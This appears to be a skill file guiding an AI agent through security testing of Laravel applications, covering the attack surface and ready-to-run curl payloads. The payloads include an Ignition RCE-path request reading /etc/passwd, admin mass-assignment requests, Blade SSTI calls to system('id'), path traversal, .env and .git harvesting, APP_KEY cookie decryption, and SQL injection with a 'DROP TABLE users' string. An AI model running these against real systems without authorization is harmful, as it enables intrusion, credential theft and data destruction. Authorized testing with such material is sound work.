---
name: laravel
description: Security testing for Laravel applications covering mass assignment, Blade injection, artisan command exposure, and debug mode
---

# Laravel Security Testing

Laravel applications expose attack surface through Eloquent ORM mass assignment, Blade template injection, artisan route exposure, debug mode in production, and cookie/session misconfigurations. Focus on Eloquent misuse, view rendering, and Laravel-specific debug endpoints.

## Attack Surface

**Eloquent ORM**
- Mass assignment via `$fillable` / `$guarded` gaps
- `Model::create($request->all())` — mass assignment
- Query scopes with user input
- `DB::raw()`, `DB::select()` with unsanitized input
- Relationship manipulation (e.g., `belongsTo` ID tampering)

**Blade Templates**
- `{{ $var }}` (escaped), `{!! $var !!}` (unescaped — XSS)
- `@php` directives in templates
- `Blade::compileString()` with user input
- `@eval()` (if custom directive exists)
- View path traversal via `view()` function

**Routing & Controllers**
- `Route::resource()` — auto-generates CRUD routes
- Missing middleware on routes
- `Route::fallback()` with user input
- API routes without Sanctum/Passport auth

**Debug & Development**
- `/` with Ignition (Laravel 8+) — RCE via solution parameters
- `_ignition/execute-solution` endpoint
- `.env` file exposure
- `APP_DEBUG=true` — full stack traces, env vars
- Telescope dashboard: `/telescope`
- Horizon dashboard: `/horizon`
- Log viewer: `/log-viewer`

**Cookies & Sessions**
- `APP_KEY` in `.env` — encrypts cookies, sessions, signed URLs
- Encrypted cookie decryption via known `APP_KEY`
- Session driver: `file`, `cookie`, `redis`, `database`
- `SESSION_SECURE_COOKIE`, `SESSION_HTTP_ONLY`, `SESSION_SAME_SITE`

**Artisan & Console**
- `php artisan tinker` via web (if exposed)
- `php artisan serve` in production
- Custom artisan commands with user input
- Queue workers processing user-controlled data

## Testing Methodology

### 1. Debug Endpoint Discovery

```bash
# Laravel Ignition RCE (Laravel < 8.x with Ignition < 2.5.2)
curl -sk https://target.com/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"username","viewFile":"php://filter/convert.base64-encode/resource=/etc/passwd"}}'

# Check for debug mode
curl -sk https://target.com/nonexistent-12345
# If APP_DEBUG=true, shows full stack trace with env vars

# Telescope dashboard
curl -sk -o /dev/null -w "%{http_code}" https://target.com/telescope
curl -sk -o /dev/null -w "%{http_code}" https://target.com/telescope/requests

# Horizon dashboard
curl -sk -o /dev/null -w "%{http_code}" https://target.com/horizon

# Log viewer
for path in /log-viewer /logs /laravel-logs; do
    curl -sk -o /dev/null -w "%{http_code} ${path}\n" "https://target.com${path}"
done
```

### 2. Mass Assignment via Eloquent

```bash
# Test registration/profile update with extra fields
curl -sk -X POST https://target.com/register \
  -d "name=test&email=test@test.com&password=Test1234!&password_confirmation=Test1234!&role=admin&is_admin=1&verified=1"

# JSON API
curl -sk -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"Test1234!","role":"admin","is_admin":true}'

# Check for IDOR via relationship tampering
curl -sk -X PUT https://target.com/api/posts/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"title":"test","user_id":2}'  # Change owner

# Test with additional hidden fields
curl -sk -X POST https://target.com/api/profile \
  -d "name=test&email=test@test.com&admin=1&permissions=super-admin"
```

### 3. Blade Template Injection

```bash
# If user input reaches {!! !!} (unescaped output)
# Test for XSS first
GET /search?q=<script>alert(1)</script>

# If Blade::compileString() is used with user input
# Test for SSTI (Blade compiles to PHP)
GET /page?template={{ system('id') }}
GET /page?template={{ passthru('id') }}
GET /page?template={{ file_get_contents('/etc/passwd') }}

# View path traversal
GET /page?view=../../../etc/passwd
GET /page?view=/proc/self/environ
```

### 4. .env File Exposure

```bash
# Common .env paths
for path in /.env /.env.bak /.env.local /.env.production /.env.staging /.env.backup; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com${path}")
    echo "$code ${path}"
done

# Check for .env in git
curl -sk https://target.com/.git/config
curl -sk https://target.com/.git/HEAD

# Check for env in error pages (when APP_DEBUG=true)
curl -sk https://target.com/trigger-error
# Look for APP_KEY, DB_PASSWORD, REDIS_PASSWORD, etc.
```

### 5. Cookie Decryption

```bash
# If APP_KEY is known (from .env leak):
# Laravel encrypts cookies with APP_KEY using AES-256-CBC
# Use laravel-cookie-decryption tools:
pip install laravel-cookie-decryption
python3 -c "
from laravel_cookie_decryption import decrypt
print(decrypt('COOKIE_VALUE', 'base64:APP_KEY'))
"

# Signed URL tampering
# Laravel signed URLs contain HMAC — can't forge without APP_KEY
# But if APP_KEY leaks, any signed URL can be forged
```

### 6. SQL Injection via Eloquent

```bash
# Raw query injection
# Vulnerable patterns:
# DB::raw("SELECT * FROM users WHERE name = '$name'")
# ->whereRaw("name = '$name'")
# ->havingRaw("count > $user_input")

# Test with:
curl -sk "https://target.com/api/users?sort=name'+UNION+SELECT+1,2,3--"
curl -sk "https://target.com/api/search?q='+OR+1=1--"

# OrderBy injection
curl -sk "https://target.com/api/users?sort=name;DROP TABLE users--"
curl -sk "https://target.com/api/users?order[name]=asc"
```

### 7. Route Discovery

```bash
# Check for exposed API documentation
for path in /api/documentation /docs /swagger /api-docs /openapi.json; do
    curl -sk -o /dev/null -w "%{http_code} ${path}\n" "https://target.com${path}"
done

# Check artisan route list (if accessible)
# Look for route prefixes in JS bundles
curl -sk https://target.com/js/app.js | grep -oP '/api/[a-zA-Z0-9/_-]+' | sort -u

# Check for route caching artifacts
curl -sk https://target.com/bootstrap/cache/routes-v7.php
```

## Laravel-Specific CWEs

| Pattern | CWE | Risk |
|---------|-----|------|
| `$guarded = []` | CWE-915 | Mass assignment |
| `DB::raw($input)` | CWE-89 | SQL injection |
| `{!! $var !!}` | CWE-79 | XSS |
| `APP_DEBUG=true` | CWE-200 | Info disclosure (env vars) |
| Ignition RCE | CWE-94 | Remote code execution |
| `.env` exposure | CWE-200 | Credential leak |
| Weak `APP_KEY` | CWE-327 | Cookie/session decryption |
| `Route::fallback()` | CWE-22 | Path traversal |

## Validation Requirements

- Mass assignment: show field was actually saved in database response
- Template injection: show actual command execution
- Debug exposure: show actual env vars, not just error page
- SQL injection: extract actual data, not just error messages

## Tools

- `curl` for manual testing
- `sqlmap` with `--prefix` for Eloquent context
- `semgrep` with PHP/Laravel rules
- `ffuf` for path discovery
- `php artisan route:list` (if source available)

## Pro Tips

- Laravel's CSRF token is in `<meta name="csrf-token">` — extract before POST testing
- Check `config/app.php` for `cipher` and `key` — weak key = full compromise
- `php artisan tinker` can be triggered via deserialization if `APP_KEY` is known
- Laravel Sanctum tokens are in `personal_access_tokens` table — check for token enumeration
- Check for `spatie/laravel-permission` — role/permission manipulation via mass assignment
- Horizon at `/horizon` may expose Redis credentials
- Laravel Pulse at `/pulse` may expose application metrics
